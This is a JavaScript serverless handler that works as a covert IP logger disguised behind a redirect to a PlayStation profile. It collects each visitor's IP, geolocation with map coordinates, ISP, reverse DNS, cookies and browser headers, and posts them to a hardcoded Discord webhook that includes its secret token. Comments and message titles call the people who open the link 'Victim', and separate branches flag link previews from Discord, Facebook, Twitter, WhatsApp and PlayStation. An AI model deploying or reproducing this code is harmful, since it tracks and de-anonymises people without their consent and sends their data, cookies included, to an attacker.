import fetch from 'node-fetch';
import dns from 'dns/promises';

const webhookUrl = "https://discord.com/api/webhooks/1317579965285531648/IyHYlXpJrQjNnFwG7N7MMusqOGxoJITSPHbIdkWfDaaMX-okBoxRL0cmGmyrT89dyd69";


async function sendToWebhook(message) {
    try {
        console.log("Attempting to send webhook message:", JSON.stringify(message, null, 2));

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message),
        });

        const responseText = await response.text();
        console.log(`Webhook Response Status: ${response.status}`);
        console.log(`Webhook Response Headers: ${JSON.stringify(response.headers.raw(), null, 2)}`);
        console.log(`Webhook Response Body: ${responseText}`);

        if (!response.ok) {
            console.error(`Webhook Error [${response.status}]: ${responseText}`);
            if (response.status === 429) {
                console.warn("Rate limit exceeded. Retrying...");
                const retryAfter = parseInt(response.headers.get('retry-after') || '1', 10) * 1000;
                await new Promise((resolve) => setTimeout(resolve, retryAfter));
                await sendToWebhook(message); // Retry
            }
        } else {
            console.log("Webhook message sent successfully.");
        }
    } catch (error) {
        console.error("Failed to send webhook:", error.stack || error);
    }
}





// Get IP details from the IP-API service
async function getIpDetails(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`);
        return await response.json();
    } catch (error) {
        console.error("Failed to retrieve IP information:", error);
        return null;
    }
}

// Log request metadata
async function logRequestMetadata(req) {
    return {
        cookies: req.headers['cookie'] || 'N/A',
        connection: req.headers['connection'] || 'N/A',
        contentTypeOptions: req.headers['x-content-type-options'] || 'N/A',
        frameOptions: req.headers['x-frame-options'] || 'N/A',
    };
}


// Perform reverse DNS lookup
async function getReverseDNS(ip) {
    try {
        const hostnames = await dns.reverse(ip);
        return hostnames.length > 0 ? hostnames.join(', ') : 'N/A';
    } catch (error) {
        console.error(`Reverse DNS lookup failed for IP ${ip}:`, error.message);
        return 'N/A';
    }
}


// Detect device type from user agent
function detectDeviceType(userAgent) {
    if (/Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
        return "Mobile";
    } else if (/Tablet|iPad/i.test(userAgent)) {
        return "Tablet";
    } else {
        return "Desktop";
    }
}





function getBrowserEngine(userAgent) {
    if (/Chrome|Chromium|Edg/.test(userAgent)) return 'Blink';
    if (/Safari/.test(userAgent)) return 'WebKit';
    if (/Gecko/.test(userAgent)) return 'Gecko';
    if (/Trident/.test(userAgent)) return 'Trident';
    return 'Unknown';
}

function getOperatingSystem(userAgent) {
    if (/Windows/.test(userAgent)) return 'Windows';
    if (/Mac/.test(userAgent)) return 'macOS';
    if (/Android/.test(userAgent)) return 'Android';
    if (/Linux/.test(userAgent)) return 'Linux';
    return 'Unknown';
}



function logDebugInfo(reverseDNS, requestMetadata) {
    console.log(`Reverse DNS result: ${reverseDNS}`);
    console.log(`Request Metadata: ${JSON.stringify(requestMetadata)}`);
}


function createCommonFields(ipDetails, coords, userAgent, deviceType, os, browserEngine, acceptLanguage, acceptEncoding, doNotTrack, referer, reverseDNS, requestMetadata) {
    const safeValue = (value, fallback = "Unknown") => `\`${value || fallback}\``;

    return [
        { name: "IP", value: safeValue(ipDetails.query, "Not available"), inline: true },
        { name: "Provider", value: safeValue(ipDetails.isp), inline: true },
        { name: "Organization", value: safeValue(ipDetails.org), inline: true },
        { name: "ASN", value: safeValue(ipDetails.as), inline: true },
        { name: "Continent", value: safeValue(ipDetails.continent), inline: true },
        { name: "Country", value: safeValue(ipDetails.country), inline: true },
        { name: "Region", value: safeValue(ipDetails.regionName), inline: true },
        { name: "City", value: safeValue(ipDetails.city), inline: true },
        { name: "District", value: safeValue(ipDetails.district), inline: true },
        { name: "Postal Code", value: safeValue(ipDetails.zip), inline: true },
        { name: "Coords", value: coords || "Not available", inline: true },
        { name: "Timezone", value: safeValue(ipDetails.timezone), inline: true },
        { name: "Reverse DNS", value: safeValue(reverseDNS, "N/A"), inline: false },
        { name: "Cookies", value: safeValue(requestMetadata.cookies, "N/A"), inline: false },
        { name: "Connection", value: safeValue(requestMetadata.connection, "N/A"), inline: true },
        { name: "Content-Type Options", value: safeValue(requestMetadata.contentTypeOptions, "N/A"), inline: true },
        { name: "Frame Options", value: safeValue(requestMetadata.frameOptions, "N/A"), inline: true },
        { name: "Device Info", value: safeValue(userAgent), inline: false },
        { name: "Device Type", value: safeValue(deviceType), inline: true },
        { name: "Operating System", value: safeValue(os), inline: true },
        { name: "Browser Rendering Engine", value: safeValue(browserEngine), inline: true },
        { name: "Browser Language", value: safeValue(acceptLanguage), inline: true },
        { name: "Accept-Encoding", value: safeValue(acceptEncoding), inline: true },
        { name: "Do Not Track", value: safeValue(doNotTrack), inline: true },
        { name: "Referer", value: safeValue(referer, "No referer"), inline: false },
        { name: "Network Type", value: safeValue(ipDetails.mobile ? "Mobile" : "Broadband"), inline: true },
        { name: "Using Proxy/VPN", value: safeValue(ipDetails.proxy ? "Yes" : "No"), inline: true },
        { name: "Hosting", value: "`No`", inline: true }
    ];
}





export default async function handler(req, res) {
    if (req.method === 'GET' || req.method === 'POST') {
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        const blacklistedIPs = ["716.147.210.120", "181.55.23.312"];

        if (blacklistedIPs.includes(ip)) {
            res.status(403).send("Forbidden: Your IP address is blacklisted.");
            return;
        }

        const ipDetails = await getIpDetails(ip);

        if (!ipDetails || ipDetails.status !== 'success') {
            console.error(`Failed to retrieve IP details for IP: ${ip}. Response: ${JSON.stringify(ipDetails)}`);
            res.status(500).send("Failed to retrieve IP information.");
            return;
        }


        const userAgent = req.headers['user-agent'] || 'Unknown';
        const acceptLanguage = req.headers['accept-language'] || 'Unknown';
        const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
        const doNotTrack = req.headers['dnt'] === '1' ? 'Yes' : 'No';
        const referer = req.headers['referer'] || 'No referer';

        const deviceType = detectDeviceType(userAgent);

        const browserEngine = getBrowserEngine(userAgent);
        const os = getOperatingSystem(userAgent);

        const coords = ipDetails.lat && ipDetails.lon
            ? `[${ipDetails.lat}, ${ipDetails.lon}](https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon})`
            : "Not available";

        // Add request metadata
        const requestMetadata = await logRequestMetadata(req);
        // Perform reverse DNS lookup
        const reverseDNS = ipDetails.query ? await getReverseDNS(ipDetails.query) : 'N/A';


        // Call in the handler function:
        logDebugInfo(reverseDNS, requestMetadata);



        // Check 1: Google LLC and Discordbot
        if (ipDetails.isp === "Google LLC" && userAgent.includes("Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)")) {
            const message = {
                embeds: [
                    {
                        title: "User Send Link To Victim from Discord Message",
                        color: 0xFF0000,
                        description: "Device info collected from sender.",
                        fields: [
                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
                        ]
                    }
                ]
            };
            await sendToWebhook(message);
            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
            return res.end();
        }

        console.log("Finished Check 1: Google LLC and Discordbot");

        // Check 2: Facebook External Hit
        if (ipDetails.isp === "Facebook, Inc." && userAgent.includes("facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)")) {
            const message = {
                embeds: [
                    {
                        title: "User Send Link To Victim Facebook/Instagram Message",
                        color: 0xFF0000,
                        description: "Device info collected from sender.",
                        fields: [
                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
                        ]
                    }
                ]
            };
            await sendToWebhook(message);
            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
            return res.end();
        }

        console.log("Finished Check 2: Facebook External Hit");

        // Check 3: Playstation External Hit
        if (ipDetails.isp === "Amazon.com, Inc." && userAgent.includes("UrlPreviewServiceV2")) {
            const message = {
                embeds: [
                    {
                        title: "User Send Link To Victim Playstation Message",
                        color: 0xFF0000,
                        description: "Device info collected from sender.",
                        fields: [
                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
                        ]
                    }
                ]
            };
            await sendToWebhook(message);
            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
            return res.end();
        }

        console.log("Finished Check 3: Playstation External Hit");

        // Check 4: Twitter External Hit
        if (ipDetails.isp === "Twitter Inc." && userAgent.includes("Twitterbot/1.0")) {
            const message = {
                embeds: [
                    {
                        title: "User Send Link To Victim Twitter Message",
                        color: 0xFF0000,
                        description: "Device info collected from sender.",
                        fields: [
                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
                        ]
                    }
                ]
            };
            await sendToWebhook(message);
            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
            return res.end();
        }

        console.log("Finished Check 4: Twitter External Hit");


        // Check 5: WhatsApp External Hit
        if (userAgent === "WhatsApp/2.23.20.0") {
            const message = {
                embeds: [
                    {
                        title: "User Send Link To Victim via WhatsApp",
                        color: 0xFF0000,
                        description: "Device info collected from sender.",
                        fields: [
                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
                        ]
                    }
                ]
            };
            await sendToWebhook(message);
            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
            return res.end();
        }

        console.log("Finished Check 5: WhatsApp External Hit");


        // Default: Full Info for Other Requests
        if (!ipDetails.hosting) {
            console.log("Preparing to send the default message with full info...");

            try {

                const fields = createCommonFields(
                    ipDetails,
                    coords,
                    userAgent,
                    deviceType,
                    os,
                    browserEngine,
                    acceptLanguage,
                    acceptEncoding,
                    doNotTrack,
                    referer,
                    reverseDNS,
                    requestMetadata
                );

                console.log("Fields for webhook message created successfully:", fields);

                const message = {
                    embeds: [
                        {
                            title: "User Opened Link",
                            color: 0x00FFFF,
                            description: "Device info collected from Victim.",
                            fields: fields
                        }
                    ]
                };

                console.log("Webhook message prepared:", JSON.stringify(message, null, 2));

                await sendToWebhook(message);

                console.log("Default webhook message sent successfully.");

            } catch (error) {
                console.error("An error occurred while sending the default webhook message:", error);
            }
        }


        console.log("Redirecting user to https://profile.playstation.com/LB7...");
        res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
        res.end();

    } else {
        res.status(405).send("Method Not Allowed");
    }
}